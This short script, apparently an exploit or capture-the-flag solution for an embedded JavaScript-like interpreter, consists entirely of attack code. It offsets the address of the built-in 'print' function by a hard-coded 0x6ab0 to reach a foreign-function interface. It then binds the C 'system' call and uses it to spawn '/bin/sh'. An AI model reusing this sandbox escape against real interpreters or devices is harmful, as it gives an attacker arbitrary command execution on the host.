let ffi = print + 0x6ab0;
let sys = ffi('int system(char *)');
sys('/bin/sh');
